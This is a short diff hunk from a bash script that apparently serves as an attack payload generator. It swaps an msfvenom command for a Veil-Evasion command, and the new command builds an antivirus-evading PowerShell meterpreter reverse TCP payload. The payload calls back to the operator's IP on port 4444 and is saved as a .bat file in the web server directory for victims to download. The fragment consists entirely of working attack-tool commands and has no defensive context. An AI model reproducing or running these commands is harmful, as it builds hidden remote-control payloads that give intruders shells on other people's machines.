@@ -55,7 +55,7 @@ paychoice=0
 elif [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
   clear
   echo -e "$g Creating payload...$w"
-  msfvenom -p windows/powershell_reverse_tcp LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
+  ./res/Veil/Veil.py -t Evasion -p powershell/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o /var/www/html/power.bat
   echo "$done"
   paychoice=11
 #Windows - Powershell - Bind_TCP
